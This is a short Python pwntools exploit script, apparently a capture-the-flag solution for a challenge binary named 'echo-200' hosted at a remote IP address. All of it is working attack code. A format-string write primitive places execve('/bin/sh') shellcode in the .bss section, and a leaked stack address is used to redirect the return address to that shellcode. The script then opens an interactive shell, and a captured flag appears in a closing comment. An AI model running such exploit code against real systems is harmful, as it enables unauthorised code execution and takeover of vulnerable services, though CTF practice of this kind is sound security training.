
from pwn import *

context(log_level ="debug")
buf = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
bss = 0x080EBF80

# p = process("./echo-200")
p = remote('106.75.9.11',20001)

got_addr =0x80EB00C
shellcode = buf
shellcode_addr = bss
ret_offset = 0xffc56dbc - 0xffc56bac

def write(addr,data):
	p.recvuntil("Reading 16 bytes\n")
	p.sendline(p32(addr)+"%%%dc" %(ord(data)-4) +"%7$hhn")

i = 0
while i < len(shellcode):
	write(shellcode_addr+i,shellcode[i])
	i +=1


p.recvuntil('Reading 16 bytes\n')
p.sendline('%5$X...')
stack_addr = int(p.recvuntil('...')[:8],16)
ret_addr = stack_addr + ret_offset

i = 0
while i < len(p32(shellcode_addr)):
	write(ret_addr+i,p32(shellcode_addr)[i])
	i +=1
# gdb.attach(p,"b*0x08048FB6\nc")
write(stack_addr-1,'\x01')

p.interactive()

#flag{b3a0b33-645f-49f0-8e30-2d7c31ecfabb}